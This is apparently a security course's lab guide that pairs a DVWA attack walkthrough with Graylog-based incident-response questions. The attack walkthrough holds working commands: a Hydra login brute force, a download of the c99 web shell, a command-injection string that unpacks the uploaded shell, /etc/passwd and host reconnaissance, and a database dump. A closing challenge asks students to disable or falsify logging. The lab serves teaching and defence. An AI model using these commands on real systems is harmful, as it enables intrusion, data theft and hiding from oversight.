# Week 4 - AuditD and logging
This week we are using DVWA for our incident response demo again. DVWA provides a vulnerable webapp that is ready to be hacked out of the box. Graylog will act as our logging server.

## Presentation
AuditD and logging systems: https://docs.google.com/presentation/d/1HiLPQ6p8dZak0xOhoN66NFmos5l11Bwbkvl5hHuep7E/edit?usp=sharing

## Setup demo
### Init
0. Install docker and docker-compose

### Spin up demo
0. docker-compose up -d

### DVWA WebGUI setup
0. Browse to `http://dvwa.hackinglab.beer:8080` 
0. Login
    1. username: admin
    1. password: password
0. Select "DVWA security" on the left
0. Set the security level to "low"
0. Continue to red teaming section

### Graylog Webgui setup
0. Browse to `http://dvwa.hackinglab.beer` 
0. Login
    1. username: admin
    1. password: admin
0. Select "System" at the top then "Inputs"
0. Select "Beats" for input type and select "Launch new input"
    1. Select node
    1. Enter "Beats input" for title
    1. Select "save"

## Perform red teaming
### Nikto scanner
0. Spin up Kali Linux VM
0. Open terminal
0. `nikto -host http://dvwa.hackinglab.beer`

### Hydra brute force
0. `hydra -l admin -P /usr/share/dirb/wordlists/small.txt dvwa.hackinglab.beer -s 8080 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V`

### Zip, upload and unzip c99.php
0. `wget https://raw.githubusercontent.com/tennc/webshell/master/php/PHPshell/c99/c99.php`
0. `gzip -f c99.php`
0. Browse http://dvwa.hackinglab.beer with CHROME and login
    1. User: admin
    1. Pass: password
0. Select "Upload" on the left
0. Select "Choose file", "c99.php.gz" then "Upload"
0. Select "Command injection" on the right
0. Enter `8.8.8.8; /bin/gunzip -v ../../hackable/uploads/c99.php` into "Enter ip address"
0. Browse to http://dvwa.hackinglab.beer:8080/hackable/uploads/c99.php

### Host situation awareness
0. Get current user: whoami
0. Get ip info: ip a
0. Get hostname: hostname
0. Get list of users: cat /etc/passwd
0. Get connection info: ss -l -n -t
0. Get process list: ps aux
0. Get known hosts: arp -a

### Dump database
0. `mysql -u root -e "show databases;"`
    1. There is no root password
0. `mysql -u root -e "use dvwa; show tables"`
0. `mysqldump -u root --database dvwa > dump.sql`
0. Use c99.php web shell to download dump

## Incident reponse demo
### Connecting to Graylog
Browse to `http://dvwa.hackinglab.beer` 
0. Login
    1. username: admin
    1. password: admin

### Understanding the machine
It is important to understand the machine you are investigating

0. What is the operating system(OS) of the attacked machine?
0. What is the kernel of the attacked machine?
0. What is the timezone of the attacked machine?
0. What is the IP address of the attacked machine?
0. What is the MAC address of the attacked machine?
0. What is the hostname of the attacked machine?
0. What network services are listening on the attcked machine? -- include ports
0. What users are on the attacked machine?

### Become the cyber detective
0. What are the version numbers of all the listening services?
0. Do the services have any known vulnerabilities? What sources/tools did you use?
0. Where are the web server logs located?
0. What is the diff between the error.log and access.log? What information do these logs provide?
0. What are the user permissions of the log files? Why does this matter?
0. What is the timezone and time format of the webservers logs? Why does this matter?
0. What is the hackers's IP address?
0. What is the hacker's user-agent?
0. What is the operating system(OS) of the hacker's machine?
0. What webshell did the attacker use? 
0. Where was that webshell uploaded to?
0. What commands/actions did the attacker use?
0. Give a brief description how the attacker stole the data?
0. Lookup three mitigations for next week.


## IR challenge
0. Browse to `http://dvwa.hackinglab.beer` 
0. Login
    1. username: admin
    1. password: admin
0. Select "Dashboard" at the top
0. Select "Create Dashboard" 
    1. Enter a name
    1. Enter a description
    1. Select "Save"
0. Select your new dashboard
0. Create widgets to display:
    1. Histogram of log data
    1. Histogram of traffic
    1. Top 10 user-agents from web logs
    1. Top 10 operating systems from web logs
    1. Top 10 browsers from web logs
    1. Top 10 IP addresses from web logs
    1. Top 10 URL's visited from web logs
    1. Top 10 IP from SSH logs
    1. Widget of your choosing to display command injection


## Red team challenge
### Disable logging
0. Easy: Discover a way to disable the logging feature between DVWA and Graylog. 
0. Hard: Discover a way to modify the logging to hide your activities.
    1. The logging mechanism must still send logs

# Resources/Sources
* https://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson14/index.html
* http://docs.graylog.org/en/2.4/pages/installation/docker.html
* https://www.elastic.co/guide/en/elasticsearch/reference/current/docker.html
* https://hub.docker.com/r/graylog2/graylog/
